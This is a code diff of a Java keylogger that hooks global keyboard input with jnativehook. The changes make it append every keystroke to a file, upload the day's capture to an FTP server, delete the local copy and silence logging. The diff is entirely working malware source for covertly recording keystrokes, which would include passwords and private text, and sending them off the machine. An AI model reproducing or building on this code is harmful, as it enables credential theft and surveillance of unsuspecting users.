@@ -1,7 +1,10 @@
 package Main;
 
 import java.util.logging.Logger;
+import java.io.IOException;
 import java.util.logging.Level;
+import java.util.logging.LogManager;
+
 import org.jnativehook.GlobalScreen;
 import org.jnativehook.NativeHookException;
 import org.jnativehook.keyboard.NativeKeyEvent;
@@ -9,13 +12,11 @@ import org.jnativehook.keyboard.NativeKeyListener;
 
 public class KeyLogger extends Thread implements NativeKeyListener, FileUploader {
 	
-	private static String textEntered;
 	private FileHandler fileHandler;
 	private FTPHandler ftpHandler;
 	private Scheduler scheduler;
 	
 	public KeyLogger() {
-		textEntered = new String();
 		fileHandler = FileHandler.getInstance();
 		ftpHandler = new FTPHandler();
 		scheduler = new Scheduler(this);
@@ -23,40 +24,53 @@ public class KeyLogger extends Thread implements NativeKeyListener, FileUploader
 
     public static void main(String[] args) {
     	KeyLogger keyLogger = new KeyLogger();
-
+    	
+    	keyLogger.checkIfPreviousDirectoryExists();
         keyLogger.initializeKeyListener();
         keyLogger.checkPeriodically();
     }
     
+    public void checkIfPreviousDirectoryExists() {
+    	String yesterdaysDate = Utils.getYesterdaysDate();
+    	String yesterdaysDirectoryPath = Utils.getDirectoryPath(yesterdaysDate);
+    	boolean pathExists = true;
+		try {
+			pathExists = ftpHandler.checkDirectoryExists(yesterdaysDirectoryPath);
+		} catch (IOException e) {
+			System.out.println("Error : " + e.getMessage());
+		}
+    	if(pathExists==false) {
+    		System.out.println("Uploading yesterdays file...");
+    		uploadFile(yesterdaysDirectoryPath, yesterdaysDate);
+    	}
+    }
+    
     public void checkPeriodically() {
+    	checkIfFileExists();
     	scheduler.checkUploadHour();
     }
     
+    public void checkIfFileExists() {
+    	if(!fileHandler.fileExists()) {
+    		fileHandler.createFile();
+    	}
+    }
+    
 	@Override
-	public void uploadFile() {
-		System.out.println("Uploading...");
-        createFile();
-        transferToFile();
-        uploadingFileToServer();
+	public void uploadFile(String directoryPath, String date) {
+		ftpHandler.createUserDirectory();
+		ftpHandler.createDateDirectory(date);
+		ftpHandler.uploadFile(fileHandler.getFile(), directoryPath);
+		fileHandler.deleteFile();
+		fileHandler.createFile();
 	}
-    
-    public void createFile() {
-    	fileHandler.createNewFile();
-    }
-    
-    public void transferToFile() {
-    	fileHandler.writeToFile(textEntered);
-    }
-    
-    public void uploadingFileToServer() {
-    	ftpHandler.uploadToServer(fileHandler.getFile());
-    }
     
 	@Override
 	public void nativeKeyPressed(NativeKeyEvent keyEvent) {
 		String keyPressed = NativeKeyEvent.getKeyText(keyEvent.getKeyCode());
 		String convertedKey = convertKey(keyPressed);
-		textEntered += convertedKey;
+		System.out.println(convertedKey);
+		fileHandler.appendToFile(convertedKey);
 	}
 	
 	public String convertKey(String keyPressed){
@@ -76,7 +90,7 @@ public class KeyLogger extends Thread implements NativeKeyListener, FileUploader
 			case "Shift" :
 				keyPressed = "";
 				break;
-			case " Ctrl " :
+			case "Ctrl" :
 				keyPressed = "";
 				break;
 		}
@@ -84,6 +98,7 @@ public class KeyLogger extends Thread implements NativeKeyListener, FileUploader
 	}
 	
     public void initializeKeyListener() {
+    	disableConsoleLogger();
         try {
             GlobalScreen.registerNativeHook();
         } 
@@ -91,13 +106,12 @@ public class KeyLogger extends Thread implements NativeKeyListener, FileUploader
             System.err.println("There was a problem registering the native hook.");
             System.exit(1);
         }
-
         GlobalScreen.addNativeKeyListener(new KeyLogger());
-        disableConsoleLogger();
     }
 	
     public void disableConsoleLogger() {
-    	Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
+    	LogManager.getLogManager().reset();
+        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
         logger.setLevel(Level.OFF);
         logger.setUseParentHandlers(false); 
     }
